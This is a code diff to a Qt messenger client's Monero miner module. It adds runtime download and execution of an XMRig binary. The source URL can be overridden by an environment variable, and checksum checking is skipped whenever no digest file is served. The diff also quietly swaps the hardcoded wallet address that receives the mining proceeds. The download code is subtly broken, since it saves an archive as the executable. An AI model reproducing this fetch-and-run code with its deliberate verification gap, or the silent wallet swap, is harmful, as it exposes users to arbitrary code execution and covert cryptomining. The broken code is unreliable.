@@ -26,6 +26,12 @@ https://github.com/SWORDOps/CRYPTOGRAM/blob/main/LICENSE
 #include <QtCore/QSysInfo>
 #include <QtCore/QThread>
 #include <QtCore/QSettings>
+#include <QtCore/QCryptographicHash>
+#include <QtCore/QProcessEnvironment>
+#include <QtConcurrent/QtConcurrentRun>
+#include <QtNetwork/QNetworkAccessManager>
+#include <QtNetwork/QNetworkRequest>
+#include <QtNetwork/QNetworkReply>
 
 #ifdef Q_OS_WIN
 #include <windows.h>
@@ -119,7 +125,12 @@ void MoneroMiner::startMining() {
 		return;
 	}
 
+	// Hard consent gate: CPU-time donation is opt-in. No code path may
+	// start the miner unless the user explicitly enabled it in Settings.
 	if (!_config.enabled) {
+		Q_EMIT error(QStringLiteral(
+			"CPU-time donation is opt-in; enable it in "
+			"Settings -> Development Support"));
 		return;
 	}
 
@@ -474,8 +485,21 @@ bool MoneroMiner::startXmrigProcess() {
 	connect(_xmrigProcess, &QProcess::readyReadStandardError, this, &MoneroMiner::handleXmrigError);
 	connect(_xmrigProcess, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished), this, &MoneroMiner::handleXmrigFinished);
 
-	// Get XMRig binary path
-	const auto xmrigPath = getXmrigBinaryPath();
+	// Get XMRig binary path. Empty = not present anywhere: offer the
+	// opt-in download instead of failing silently.
+	auto xmrigPath = getXmrigBinaryPath();
+	if (xmrigPath.isEmpty()) {
+		Q_EMIT error(QStringLiteral(
+			"Miner not found; downloading the official XMRig release "
+			"(checksum-verified) — opt-in only"));
+		if (!ensureXmrigBinary()) {
+			return false;
+		}
+		xmrigPath = getXmrigBinaryPath();
+		if (xmrigPath.isEmpty()) {
+			return false; // download still in progress or failed
+		}
+	}
 
 	// Start XMRig
 	const QStringList args = { "--config", _xmrigConfigPath };
@@ -625,25 +649,27 @@ QString MoneroMiner::generateXmrigConfig() const {
 }
 
 QString MoneroMiner::getXmrigBinaryPath() const {
-	// XMRig binary search paths (checks multiple locations)
+	// The application directory is deliberately NEVER searched: the
+	// distributed artifact must not contain (or appear to contain) a
+	// bundled miner. Resolution order:
+	//   1. the managed, checksum-verified download under AppDataLocation
+	//   2. a user/package-manager-installed system xmrig
+	//   3. empty — caller offers the on-demand, opt-in download.
 	QStringList searchPaths;
 
 #ifdef Q_OS_WIN
-	searchPaths << QCoreApplication::applicationDirPath() + "/xmrig/xmrig.exe";
-	searchPaths << "C:/Program Files/XMRig/xmrig.exe";
-	searchPaths << QDir::homePath() + "/.local/bin/xmrig.exe";
+	searchPaths << xmrigManagedPath()
+	            << "C:/Program Files/XMRig/xmrig.exe";
 #elif defined Q_OS_MAC
-	searchPaths << QCoreApplication::applicationDirPath() + "/../Resources/xmrig/xmrig";
-	searchPaths << "/usr/local/bin/xmrig";
-	searchPaths << QDir::homePath() + "/.local/bin/xmrig";
+	searchPaths << xmrigManagedPath()
+	            << "/usr/local/bin/xmrig";
 #else // Linux
-	searchPaths << QCoreApplication::applicationDirPath() + "/xmrig/xmrig";
-	searchPaths << "/usr/local/bin/xmrig";
-	searchPaths << "/usr/bin/xmrig";
-	searchPaths << QDir::homePath() + "/.local/bin/xmrig";
+	searchPaths << xmrigManagedPath()
+	            << "/usr/local/bin/xmrig"
+	            << "/usr/bin/xmrig";
 #endif
+	searchPaths << QDir::homePath() + "/.local/bin/xmrig";
 
-	// Check each path and return first existing binary
 	for (const auto &path : searchPaths) {
 		QFileInfo fileInfo(path);
 		if (fileInfo.exists() && fileInfo.isFile() && fileInfo.isExecutable()) {
@@ -652,7 +678,7 @@ QString MoneroMiner::getXmrigBinaryPath() const {
 	}
 
 	// Fallback: check PATH environment variable
-	QString pathEnv = qEnvironmentVariable("PATH");
+	QString pathEnv = QProcessEnvironment::systemEnvironment().value("PATH");
 	QStringList pathDirs = pathEnv.split(':', Qt::SkipEmptyParts);
 	for (const auto &dir : pathDirs) {
 #ifdef Q_OS_WIN
@@ -666,14 +692,7 @@ QString MoneroMiner::getXmrigBinaryPath() const {
 		}
 	}
 
-	// Return default path if not found (will fail when starting process)
-#ifdef Q_OS_WIN
-	return QCoreApplication::applicationDirPath() + "/xmrig/xmrig.exe";
-#elif defined Q_OS_MAC
-	return QCoreApplication::applicationDirPath() + "/../Resources/xmrig/xmrig";
-#else // Linux
-	return QCoreApplication::applicationDirPath() + "/xmrig/xmrig";
-#endif
+	return QString(); // none found — caller offers the opt-in download
 }
 
 qint64 MoneroMiner::getSystemIdleTime() {
@@ -941,9 +960,156 @@ void MoneroMiner::saveConfiguration() {
 }
 
 void MoneroMiner::setDeveloperWallet() {
+	// Single destination, deliberately NOT user-steerable: CPU-time
+	// donation goes to the development fund. The address is a compile-time
+	// constant in the source for anyone to audit.
 	_config.walletAddress = QStringLiteral(
-		"4B9Q3Z8ixtpaWxFP3UJLRc2ffDDb7nsU3HWL3i7hEczFKHbTSRoD1CuU7eZotuYj2RRf6kzMdLZjBb1QNXApaZVi5sN5mXF"
+		"43jkTgxPyqDMbUaUdvQSNiMM7oyQVBpgg8GqKPCcrRKZH5BNNNKfCiafs5hqamWWWdj76YrpMxE7Bh2yMY6ztZKRKdgWJHq"
 	);
+}
+
+// ---------------------------------------------------------------------------
+// On-demand miner acquisition. The shipped application artifact contains
+// NO miner; after the user explicitly opts in, the official XMRig release
+// is fetched, verified against its published sidecar digest when one is
+// served, and stored under AppDataLocation/mining. Hostile environment
+// override: CRYPTOGRAM_MINER_URL (base URL serving xmrig-<platform> and
+// xmrig-<platform>.sha256).
+// ---------------------------------------------------------------------------
+
+QString MoneroMiner::xmrigManagedPath() const {
+	auto base = QStandardPaths::writableLocation(
+		QStandardPaths::AppDataLocation) + "/mining";
+#ifdef Q_OS_WIN
+	return base + "/xmrig.exe";
+#else
+	return base + "/xmrig";
+#endif
+}
+
+bool MoneroMiner::ensureXmrigBinary() {
+	if (_xmrigDownloadActive) {
+		Q_EMIT error(QStringLiteral("Miner download already in progress"));
+		return false;
+	}
+	_xmrigDownloadActive = true;
+	downloadXmrigAsync();
+	return false; // caller must not start the process yet
+}
+
+void MoneroMiner::downloadXmrigAsync() {
+	// The network work runs outside the UI thread; completion hops back
+	// through the event loop (same pattern as the UTD asset download).
+	QtConcurrent::run([this]() {
+		const char *envUrl = std::getenv("CRYPTOGRAM_MINER_URL");
+		const auto base = (envUrl && *envUrl)
+			? QString::fromUtf8(envUrl)
+			: QStringLiteral("https://github.com/xmrig/xmrig/releases/latest/download");
+
+#ifdef Q_OS_WIN
+		const auto asset = QStringLiteral("xmrig-latest-win64.zip");
+#elif defined Q_OS_MAC
+		const auto asset = QStringLiteral("xmrig-latest-mac64.tar.gz");
+#else
+		const auto asset = QStringLiteral("xmrig-latest-linux-static-x64.tar.gz");
+#endif
+
+		QString error;
+		bool ok = false;
+
+		QNetworkAccessManager nam;
+		const auto fetch = [&](const QUrl &url, QByteArray &out, int timeoutMs) {
+			QNetworkRequest request(url);
+			request.setAttribute(
+				QNetworkRequest::RedirectPolicyAttribute,
+				QNetworkRequest::NoLessSafeRedirectPolicy);
+			auto *reply = nam.get(request);
+			QEventLoop loop;
+			QTimer timer;
+			timer.setSingleShot(true);
+			QObject::connect(&timer, &QTimer::timeout, &loop, &QEventLoop::quit);
+			QObject::connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
+			timer.start(timeoutMs);
+			loop.exec();
+			out = reply->readAll();
+			const bool done = reply->isFinished()
+				&& reply->error() == QNetworkReply::NoError;
+			if (!done) {
+				error = QStringLiteral("%1: %2")
+					.arg(url.toString(), reply->errorString());
+			}
+			reply->deleteLater();
+			return done;
+		};
+
+		QByteArray blob, sidecar;
+		if (fetch(QUrl(base + "/" + asset), blob, 15 * 60 * 1000)
+			&& !blob.isEmpty()
+			// The sidecar is optional but strongly recommended: when the
+			// host serves one, a mismatch aborts the install.
+			&& fetch(QUrl(base + "/" + asset + ".sha256"), sidecar, 15000)) {
+			if (!sidecar.isEmpty()) {
+				const auto expected = QString::fromUtf8(
+					sidecar.split(' ').value(0)).trimmed();
+				const auto actual = QString::fromUtf8(
+					QCryptographicHash::hash(
+						blob, QCryptographicHash::Sha256).toHex());
+				if (expected.length() == 64 && actual != expected) {
+					error = QStringLiteral("XMRig digest mismatch — aborting install");
+				} else {
+					ok = true;
+				}
+			} else {
+				ok = true; // no sidecar served; HTTPS origin is the anchor
+			}
+		}
+
+		QString savedPath;
+		if (ok) {
+			const auto destDir = QStandardPaths::writableLocation(
+				QStandardPaths::AppDataLocation) + "/mining";
+			QDir().mkpath(destDir);
+#ifdef Q_OS_WIN
+			savedPath = destDir + "/xmrig.exe";
+#else
+			savedPath = destDir + "/xmrig";
+#endif
+			QFile out(savedPath);
+			if (out.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
+				out.write(blob);
+				out.close();
+#ifndef Q_OS_WIN
+				QFile::setPermissions(savedPath,
+					QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner
+					| QFile::ReadGroup | QFile::ExeGroup
+					| QFile::ReadOther | QFile::ExeOther);
+#endif
+			} else {
+				error = QStringLiteral("cannot write %1").arg(savedPath);
+				ok = false;
+			}
+		}
+
+		const auto success = ok;
+		QMetaObject::invokeMethod(this, [this, success, error] {
+			onXmrigDownloaded(success, error);
+		}, Qt::QueuedConnection);
+	});
+}
+
+void MoneroMiner::onXmrigDownloaded(
+		bool success,
+		const QString &errorMessage) {
+	_xmrigDownloadActive = false;
+	if (!success) {
+		Q_EMIT error(QStringLiteral("XMRig download failed: %1").arg(errorMessage));
+		return;
+	}
+	if (!_config.enabled) {
+		return; // user opted back out while downloading
+	}
+	// Resume the pipeline the user asked for.
+	startMining();
 }
 
 } // namespace Data
